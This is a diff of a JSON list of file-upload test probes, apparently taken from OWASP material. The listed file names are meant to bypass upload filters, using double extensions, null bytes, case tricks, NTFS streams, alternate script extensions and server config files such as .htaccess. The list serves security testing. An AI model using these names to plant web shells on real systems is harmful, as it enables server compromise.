@@ -3,2700 +3,1668 @@
     "id": "file-upload-owasp-0001",
     "name": "Double Extensions",
     "template": "shell.php.jpg",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.jpg",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.jpg"
   },
   {
     "id": "file-upload-owasp-0002",
     "name": "Double Extensions #2",
     "template": "shell.php.png",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.png",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.png"
   },
   {
     "id": "file-upload-owasp-0003",
     "name": "Double Extensions #3",
     "template": "shell.php.gif",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.gif",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.gif"
   },
   {
     "id": "file-upload-owasp-0004",
     "name": "Double Extensions #4",
     "template": "shell.php.pdf",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.pdf",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.pdf"
   },
   {
     "id": "file-upload-owasp-0005",
     "name": "Double Extensions #5",
     "template": "shell.php.txt",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.txt",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.php.txt"
   },
   {
     "id": "file-upload-owasp-0006",
     "name": "Double Extensions #6",
     "template": "shell.jpg.php",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.jpg.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.jpg.php"
   },
   {
     "id": "file-upload-owasp-0007",
     "name": "Double Extensions #7",
     "template": "shell.png.php",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.png.php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: shell.png.php"
   },
   {
     "id": "file-upload-owasp-0008",
     "name": "Double Extensions #8",
     "template": "exploit.asp.jpg",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: exploit.asp.jpg",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: exploit.asp.jpg"
   },
   {
     "id": "file-upload-owasp-0009",
     "name": "Double Extensions #9",
     "template": "exploit.aspx.png",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: exploit.aspx.png",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: exploit.aspx.png"
   },
   {
     "id": "file-upload-owasp-0010",
     "name": "Double Extensions #10",
     "template": "backdoor.jsp.gif",
-    "description": "Double Extensions probe from OWASP. Tests application handling of: backdoor.jsp.gif",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Double Extensions probe from OWASP. Tests application handling of: backdoor.jsp.gif"
   },
   {
     "id": "file-upload-owasp-0011",
     "name": "Case Variations",
     "template": "shell.PHP",
-    "description": "Case Variations probe from OWASP. Tests application handling of: shell.PHP",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Variations probe from OWASP. Tests application handling of: shell.PHP"
   },
   {
     "id": "file-upload-owasp-0012",
     "name": "Case Variations #2",
     "template": "shell.PhP",
-    "description": "Case Variations probe from OWASP. Tests application handling of: shell.PhP",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Variations probe from OWASP. Tests application handling of: shell.PhP"
   },
   {
     "id": "file-upload-owasp-0013",
     "name": "Case Variations #3",
     "template": "shell.pHp",
-    "description": "Case Variations probe from OWASP. Tests application handling of: shell.pHp",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Variations probe from OWASP. Tests application handling of: shell.pHp"
   },
   {
     "id": "file-upload-owasp-0014",
     "name": "Case Variations #4",
     "template": "shell.Php",
-    "description": "Case Variations probe from OWASP. Tests application handling of: shell.Php",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Variations probe from OWASP. Tests application handling of: shell.Php"
   },
   {
     "id": "file-upload-owasp-0015",
     "name": "Case Variations #5",
     "template": "shell.PHp",
-    "description": "Case Variations probe from OWASP. Tests application handling of: shell.PHp",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Variations probe from OWASP. Tests application handling of: shell.PHp"
   },
   {
     "id": "file-upload-owasp-0016",
     "name": "Case Variations #6",
     "template": "shell.ASP",
-    "description": "Case Variations probe from OWASP. Tests application handling of: shell.ASP",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Variations probe from OWASP. Tests application handling of: shell.ASP"
   },
   {
     "id": "file-upload-owasp-0017",
     "name": "Case Variations #7",
     "template": "shell.ASPX",
-    "description": "Case Variations probe from OWASP. Tests application handling of: shell.ASPX",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Variations probe from OWASP. Tests application handling of: shell.ASPX"
   },
   {
     "id": "file-upload-owasp-0018",
     "name": "Case Variations #8",
     "template": "shell.AsP",
-    "description": "Case Variations probe from OWASP. Tests application handling of: shell.AsP",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Variations probe from OWASP. Tests application handling of: shell.AsP"
   },
   {
     "id": "file-upload-owasp-0019",
     "name": "Case Variations #9",
     "template": "shell.JSP",
-    "description": "Case Variations probe from OWASP. Tests application handling of: shell.JSP",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Case Variations probe from OWASP. Tests application handling of: shell.JSP"
   },
   {
     "id": "file-upload-owasp-0020",
     "name": "Null Byte Injection (older systems)",
     "template": "shell.php%00.jpg",
-    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: shell.php%00.jpg",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: shell.php%00.jpg"
   },
   {
     "id": "file-upload-owasp-0021",
     "name": "Null Byte Injection (older systems) #2",
     "template": "shell.php%00.png",
-    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: shell.php%00.png",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: shell.php%00.png"
   },
   {
     "id": "file-upload-owasp-0022",
     "name": "Null Byte Injection (older systems) #3",
     "template": "shell.php\\x00.jpg",
-    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: shell.php\\x00.jpg",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: shell.php\\x00.jpg"
   },
   {
     "id": "file-upload-owasp-0023",
     "name": "Null Byte Injection (older systems) #4",
     "template": "shell.asp%00.gif",
-    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: shell.asp%00.gif",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: shell.asp%00.gif"
   },
   {
     "id": "file-upload-owasp-0024",
     "name": "Null Byte Injection (older systems) #5",
     "template": "exploit.jsp%00.pdf",
-    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: exploit.jsp%00.pdf",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Null Byte Injection (older systems) probe from OWASP. Tests application handling of: exploit.jsp%00.pdf"
   },
   {
     "id": "file-upload-owasp-0025",
     "name": "Special Characters",
     "template": "shell.php.....",
-    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php.....",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php....."
   },
   {
     "id": "file-upload-owasp-0026",
     "name": "Special Characters #2",
     "template": "shell.php%20",
-    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php%20",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php%20"
   },
   {
     "id": "file-upload-owasp-0027",
     "name": "Special Characters #3",
     "template": "shell.php%0a",
-    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php%0a",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php%0a"
   },
   {
     "id": "file-upload-owasp-0028",
     "name": "Special Characters #4",
     "template": "shell.php%00",
-    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php%00",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php%00"
   },
   {
     "id": "file-upload-owasp-0029",
     "name": "Special Characters #5",
     "template": "shell.php%0d%0a",
-    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php%0d%0a",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php%0d%0a"
   },
   {
     "id": "file-upload-owasp-0030",
     "name": "Special Characters #6",
     "template": "shell.php::$DATA",
-    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php::$DATA",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php::$DATA"
   },
   {
     "id": "file-upload-owasp-0031",
     "name": "Special Characters #7",
     "template": "shell.php::$INDEX_ALLOCATION",
-    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php::$INDEX_ALLOCATION",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Special Characters probe from OWASP. Tests application handling of: shell.php::$INDEX_ALLOCATION"
   },
   {
     "id": "file-upload-owasp-0032",
     "name": "Alternate Extensions (PHP)",
     "template": "shell.php3",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.php3",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.php3"
   },
   {
     "id": "file-upload-owasp-0033",
     "name": "Alternate Extensions (PHP) #2",
     "template": "shell.php4",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.php4",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.php4"
   },
   {
     "id": "file-upload-owasp-0034",
     "name": "Alternate Extensions (PHP) #3",
     "template": "shell.php5",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.php5",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.php5"
   },
   {
     "id": "file-upload-owasp-0035",
     "name": "Alternate Extensions (PHP) #4",
     "template": "shell.php7",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.php7",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.php7"
   },
   {
     "id": "file-upload-owasp-0036",
     "name": "Alternate Extensions (PHP) #5",
     "template": "shell.phtml",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.phtml",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.phtml"
   },
   {
     "id": "file-upload-owasp-0037",
     "name": "Alternate Extensions (PHP) #6",
     "template": "shell.phar",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.phar",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.phar"
   },
   {
     "id": "file-upload-owasp-0038",
     "name": "Alternate Extensions (PHP) #7",
     "template": "shell.phpt",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.phpt",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.phpt"
   },
   {
     "id": "file-upload-owasp-0039",
     "name": "Alternate Extensions (PHP) #8",
     "template": "shell.pgif",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.pgif",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.pgif"
   },
   {
     "id": "file-upload-owasp-0040",
     "name": "Alternate Extensions (PHP) #9",
     "template": "shell.pht",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.pht",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.pht"
   },
   {
     "id": "file-upload-owasp-0041",
     "name": "Alternate Extensions (PHP) #10",
     "template": "shell.inc",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.inc",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.inc"
   },
   {
     "id": "file-upload-owasp-0042",
     "name": "Alternate Extensions (PHP) #11",
     "template": "shell.hphp",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.hphp",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.hphp"
   },
   {
     "id": "file-upload-owasp-0043",
     "name": "Alternate Extensions (PHP) #12",
     "template": "shell.ctp",
-    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.ctp",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (PHP) probe from OWASP. Tests application handling of: shell.ctp"
   },
   {
     "id": "file-upload-owasp-0044",
     "name": "Alternate Extensions (ASP/ASPX)",
     "template": "shell.asp",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.asp",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.asp"
   },
   {
     "id": "file-upload-owasp-0045",
     "name": "Alternate Extensions (ASP/ASPX) #2",
     "template": "shell.aspx",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.aspx",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.aspx"
   },
   {
     "id": "file-upload-owasp-0046",
     "name": "Alternate Extensions (ASP/ASPX) #3",
     "template": "shell.asa",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.asa",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.asa"
   },
   {
     "id": "file-upload-owasp-0047",
     "name": "Alternate Extensions (ASP/ASPX) #4",
     "template": "shell.asax",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.asax",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.asax"
   },
   {
     "id": "file-upload-owasp-0048",
     "name": "Alternate Extensions (ASP/ASPX) #5",
     "template": "shell.ascx",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.ascx",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.ascx"
   },
   {
     "id": "file-upload-owasp-0049",
     "name": "Alternate Extensions (ASP/ASPX) #6",
     "template": "shell.ashx",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.ashx",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.ashx"
   },
   {
     "id": "file-upload-owasp-0050",
     "name": "Alternate Extensions (ASP/ASPX) #7",
     "template": "shell.asmx",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.asmx",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.asmx"
   },
   {
     "id": "file-upload-owasp-0051",
     "name": "Alternate Extensions (ASP/ASPX) #8",
     "template": "shell.cer",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.cer",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.cer"
   },
   {
     "id": "file-upload-owasp-0052",
     "name": "Alternate Extensions (ASP/ASPX) #9",
     "template": "shell.config",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.config",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.config"
   },
   {
     "id": "file-upload-owasp-0053",
     "name": "Alternate Extensions (ASP/ASPX) #10",
     "template": "shell.soap",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.soap",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.soap"
   },
   {
     "id": "file-upload-owasp-0054",
     "name": "Alternate Extensions (ASP/ASPX) #11",
     "template": "shell.rem",
-    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.rem",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (ASP/ASPX) probe from OWASP. Tests application handling of: shell.rem"
   },
   {
     "id": "file-upload-owasp-0055",
     "name": "Alternate Extensions (JSP)",
     "template": "shell.jsp",
-    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jsp",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jsp"
   },
   {
     "id": "file-upload-owasp-0056",
     "name": "Alternate Extensions (JSP) #2",
     "template": "shell.jspx",
-    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jspx",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jspx"
   },
   {
     "id": "file-upload-owasp-0057",
     "name": "Alternate Extensions (JSP) #3",
     "template": "shell.jsw",
-    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jsw",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jsw"
   },
   {
     "id": "file-upload-owasp-0058",
     "name": "Alternate Extensions (JSP) #4",
     "template": "shell.jsv",
-    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jsv",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jsv"
   },
   {
     "id": "file-upload-owasp-0059",
     "name": "Alternate Extensions (JSP) #5",
     "template": "shell.jspf",
-    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jspf",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Alternate Extensions (JSP) probe from OWASP. Tests application handling of: shell.jspf"
   },
   {
     "id": "file-upload-owasp-0060",
     "name": "Other Language Extensions",
     "template": "shell.pl",
-    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.pl",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.pl"
   },
   {
     "id": "file-upload-owasp-0061",
     "name": "Other Language Extensions #2",
     "template": "shell.pm",
-    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.pm",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.pm"
   },
   {
     "id": "file-upload-owasp-0062",
     "name": "Other Language Extensions #3",
     "template": "shell.cgi",
-    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.cgi",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.cgi"
   },
   {
     "id": "file-upload-owasp-0063",
     "name": "Other Language Extensions #4",
     "template": "shell.py",
-    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.py",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.py"
   },
   {
     "id": "file-upload-owasp-0064",
     "name": "Other Language Extensions #5",
     "template": "shell.pyc",
-    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.pyc",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.pyc"
   },
   {
     "id": "file-upload-owasp-0065",
     "name": "Other Language Extensions #6",
     "template": "shell.rb",
-    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.rb",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.rb"
   },
   {
     "id": "file-upload-owasp-0066",
     "name": "Other Language Extensions #7",
     "template": "shell.rbw",
-    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.rbw",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.rbw"
   },
   {
     "id": "file-upload-owasp-0067",
     "name": "Other Language Extensions #8",
     "template": "shell.sh",
-    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.sh",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.sh"
   },
   {
     "id": "file-upload-owasp-0068",
     "name": "Other Language Extensions #9",
     "template": "shell.bash",
-    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.bash",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Other Language Extensions probe from OWASP. Tests application handling of: shell.bash"
   },
   {
     "id": "file-upload-owasp-0069",
     "name": "Executable Extensions",
     "template": "malware.exe",
-    "description": "Executable Extensions probe from OWASP. Tests application handling of: malware.exe",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Executable Extensions probe from OWASP. Tests application handling of: malware.exe"
   },
   {
     "id": "file-upload-owasp-0070",
     "name": "Executable Extensions #2",
     "template": "backdoor.bat",
-    "description": "Executable Extensions probe from OWASP. Tests application handling of: backdoor.bat",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Executable Extensions probe from OWASP. Tests application handling of: backdoor.bat"
   },
   {
     "id": "file-upload-owasp-0071",
     "name": "Executable Extensions #3",
     "template": "script.cmd",
-    "description": "Executable Extensions probe from OWASP. Tests application handling of: script.cmd",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Executable Extensions probe from OWASP. Tests application handling of: script.cmd"
   },
   {
     "id": "file-upload-owasp-0072",
     "name": "Executable Extensions #4",
     "template": "payload.ps1",
-    "description": "Executable Extensions probe from OWASP. Tests application handling of: payload.ps1",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Executable Extensions probe from OWASP. Tests application handling of: payload.ps1"
   },
   {
     "id": "file-upload-owasp-0073",
     "name": "Executable Extensions #5",
     "template": "reverse.sh",
-    "description": "Executable Extensions probe from OWASP. Tests application handling of: reverse.sh",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Executable Extensions probe from OWASP. Tests application handling of: reverse.sh"
   },
   {
     "id": "file-upload-owasp-0074",
     "name": "Server Config Files",
     "template": ".htaccess",
-    "description": "Server Config Files probe from OWASP. Tests application handling of: .htaccess",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Server Config Files probe from OWASP. Tests application handling of: .htaccess"
   },
   {
     "id": "file-upload-owasp-0075",
     "name": "Server Config Files #2",
     "template": ".htpasswd",
-    "description": "Server Config Files probe from OWASP. Tests application handling of: .htpasswd",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Server Config Files probe from OWASP. Tests application handling of: .htpasswd"
   },
   {
     "id": "file-upload-owasp-0076",
     "name": "Server Config Files #3",
     "template": "web.config",
-    "description": "Server Config Files probe from OWASP. Tests application handling of: web.config",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Server Config Files probe from OWASP. Tests application handling of: web.config"
   },
   {
     "id": "file-upload-owasp-0077",
     "name": "Server Config Files #4",
     "template": "httpd.conf",
-    "description": "Server Config Files probe from OWASP. Tests application handling of: httpd.conf",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Server Config Files probe from OWASP. Tests application handling of: httpd.conf"
   },
   {
     "id": "file-upload-owasp-0078",
     "name": "Server Config Files #5",
     "template": ".user.ini",
-    "description": "Server Config Files probe from OWASP. Tests application handling of: .user.ini",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
+    "description": "Server Config Files probe from OWASP. Tests application handling of: .user.ini"
   },
   {
     "id": "file-upload-owasp-0079",
     "name": "Server Config Files #6",
     "template": "php.ini",
-    "description": "Server Config Files probe from OWASP. Tests application handling of: php.ini",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0080",
-    "name": "Legitimate looking but with malicious content",
-    "template": "Content-Type: image/jpeg",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: image/jpeg",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0081",
-    "name": "Legitimate looking but with malicious content #2",
-    "template": "Content-Type: image/png",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: image/png",
-    "enabled": true,
-    "sourceType": "OWASP",
-    "sourceFile": "file-upload-payloads.txt"
-  },
-  {
-    "id": "file-upload-owasp-0082",
-    "name": "Legitimate looking but with malicious content #3",
-    "template": "Content-Type: image/gif",
-    "description": "Legitimate looking but with malicious content probe from OWASP. Tests application handling of: Content-Type: image/gif",
-    "enabled": true,
-    "sourceType": "OWASP",
